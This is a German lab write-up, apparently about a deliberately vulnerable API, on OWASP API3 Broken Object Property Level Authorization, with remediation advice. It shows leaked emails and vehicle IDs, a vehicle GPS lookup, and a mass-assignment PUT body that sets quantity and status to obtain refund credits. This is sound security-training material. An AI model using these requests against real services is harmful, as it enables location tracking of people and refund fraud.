# BOPLA

# TL;DR
- Posts-Endpunkt gibt unnötige sensible Daten preis (E-Mail, vehicle_id, Metadaten).
- Über vehicle_id können fremde Fahrzeugstandorte abgefragt werden.
- Orders-API übernimmt Felder ungeprüft und erlaubt Manipulation von quantity und status.
- Kombination führt zu vollständiger Property-Level-Kom­promittierung der betroffenen Objekte.

## Broken Object Property Level Authorization
API3: Broken Object Property Level Authorization entsteht typischerweise durch zwei Ursachen: Excessive Data Exposure 
und Mass Assignment.

Excessive Data Exposure beschreibt Situationen, in denen die API mehr Daten zurückliefert, als für den jeweiligen Benutzer vorgesehen ist. 
Die Anwendung filtert sensible Felder nicht serverseitig. Dadurch werden interne Attribute offengelegt.

Mass Assignment bezeichnet hingegen die unkontrollierte Übernahme eingehender Daten in serverseitige Objekte. Wenn die API ohne explizite 
Whitelists oder Validierungslogik alle übermittelten Felder übernimmt, können Angreifer verborgene oder eigentlich unveränderbare Eigenschaften 
manipulieren.

## Excessive Data Exposure
Der Endpunkt *GET /community/api/v2/community/posts/recent* und *GET community/api/v2/community/posts/* weisen Excessive Data Exposure auf, da die API nicht nur Titel, Inhalt und Name 
des Autors und Zeitpunkt wie im UI zurückgibt sondern auch sensitive Daten wie die Email und die Fahrzeug-ID der Autors. Gleiche Informationen 
werden ebenfalls über alle User geteilt, die diesen Post kommentiert haben:

<img width="1838" height="960" alt="image" src="https://github.com/user-attachments/assets/82122ba6-b227-41fe-bc47-4d7e449802b6" />

```json
{
    "posts": [
        {
            "id": "KWi6emQo7iZYGKBqXBr623",
            "title": "Title 3",
            "content": "Hello world 3",
            "author": {
                "nickname": "Robot",
                "email": "robot001@example.com",
                "vehicleid": "4bae9968-ec7f-4de3-a3a0-ba1b2ab5e5e5",
                "profile_pic_url": "",
                "created_at": "2025-10-25T19:54:07.384Z"
            },
            "comments": [
                {
                    "id": "",
                    "content": "test",
                    "CreatedAt": "2025-11-22T21:10:48.657Z",
                    "author": {
                        "nickname": "userTest",
                        "email": "userTest@mail.com",
                        "vehicleid": "d4c4ae41-f885-44be-946d-561f750ba339",
                        "profile_pic_url": "",
                        "created_at": "2025-11-22T21:10:48.657Z"
                    }
                }
            ],
            "authorid": 3,
            "CreatedAt": "2025-10-25T19:54:07.384Z"
        },
        {
            "id": "dBXUtwg37YBQzRXtsi87NL",
            "title": "Title 2",
            "content": "Hello world 2",
            "author": {
                "nickname": "Pogba",
                "email": "pogba006@example.com",
                "vehicleid": "cd515c12-0fc1-48ae-8b61-9230b70a845b",
                "profile_pic_url": "",
                "created_at": "2025-10-25T19:54:07.382Z"
            },
            "comments": [],
            "authorid": 2,
            "CreatedAt": "2025-10-25T19:54:07.382Z"
        },
        {
            "id": "stTWq8AQEyBhqCPmmwvRpZ",
            "title": "Title 1",
            "content": "Hello world 1",
            "author": {
                "nickname": "Adam",
                "email": "adam007@example.com",
                "vehicleid": "f89b5f21-7829-45cb-a650-299a61090378",
                "profile_pic_url": "",
                "created_at": "2025-10-25T19:54:07.364Z"
            },
            "comments": [],
            "authorid": 1,
            "CreatedAt": "2025-10-25T19:54:07.364Z"
        }
    ],
    "next_offset": null,
    "previous_offset": null,
    "total": 3
}
```

Über den Endpoint *GET /identity/api/v2/vehicle/{id}/location* lässt sich mit der vehicle_id der GPS Standort des Fahrzeugs ermitteln:   

<img width="1838" height="960" alt="image" src="https://github.com/user-attachments/assets/df610a47-1569-4cd5-a9a7-468da3801135" />


## Mass Assignment
Der Endpoint *GET /workshop/api/shop/orders/{id}* ist anfällig für Mass Assignment, da der Server neben GET auch die HTTP-Methode PUT 
unterstützt und Felder aus dem Request-Body des Client ohne Whitelist übernimmt.

1. Order erstellen und über GET-Endpunkt Objektfelder analysieren:

<img width="1838" height="960" alt="image" src="https://github.com/user-attachments/assets/54ec0a31-fbee-4235-84fb-3a5b6ab3e733" />

```json
{
    "order": {
        "id": 17,
        "user": {
            "email": "userB@mail.com",
            "number": "2222222221"
        },
        "product": {
            "id": 2,
            "name": "Wheel",
            "price": "10.00",
            "image_url": "images/wheel.svg"
        },
        "quantity": 1,
        "status": "delivered",
        "transaction_id": "beb468a5-4309-4ab1-8e25-f96ad084f713",
        "created_on": "2025-11-22T21:52:44.066286"
    },
    "payment": {
        "transaction_id": "beb468a5-4309-4ab1-8e25-f96ad084f713",
        "order_id": 17,
        "amount": 10,
        "paid_on": "2025-11-22T21:52:44.066286",
        "card_number": "XXXXXXXXXXXX0235",
        "card_owner_name": "userB",
        "card_type": "MasterCard",
        "card_expiry": "08/2028",
        "currency": "USD"
    }
}
```

2. HTTP-Methode auf PUT ändern und Felder *quantity* und *status* raw in den Request-Body schreiben:
<img width="1838" height="960" alt="image" src="https://github.com/user-attachments/assets/e63fb65b-f97d-46b9-a937-e63a134e0fd5" />

```json
{
    "orders": {
        "id": 17,
        "user": {
            "email": "userB@mail.com",
            "number": "2222222221"
        },
        "product": {
            "id": 2,
            "name": "Wheel",
            "price": "10.00",
            "image_url": "images/wheel.svg"
        },
        "quantity": 1000,
        "status": "returned",
        "transaction_id": "beb468a5-4309-4ab1-8e25-f96ad084f713",
        "created_on": "2025-11-22T21:52:44.066286"
    }
}
```
Der Server akzeptiert die Anfrage und übernimmt die Felder der PUT-Request. Das führt dazu, dass das Backend dem User die Stückzahl * Preis 
der Order zurückerstattet, wodurch dem User effektiv beliebig viel Credits erstattet werden können.

<img width="1838" height="960" alt="image" src="https://github.com/user-attachments/assets/83d7b9cf-9ac5-42c8-99c3-1e4134bad22c" />

## Fix
- Serverseitige Whitelists definieren, welche Felder vom Client gesetzt werden dürfen
- DTOs verwenden, um nur explizit erlaubte Properties zu übernehmen
- Kritische Felder wie status, transaction_id, amount ausschließlich serverseitig berechnen
- Property-Level-Authorization einführen: für jedes Feld prüfen, ob der Benutzer es ändern darf
- Felder, die nicht im DTO vorkommen, ignorieren (Deny-by-default)
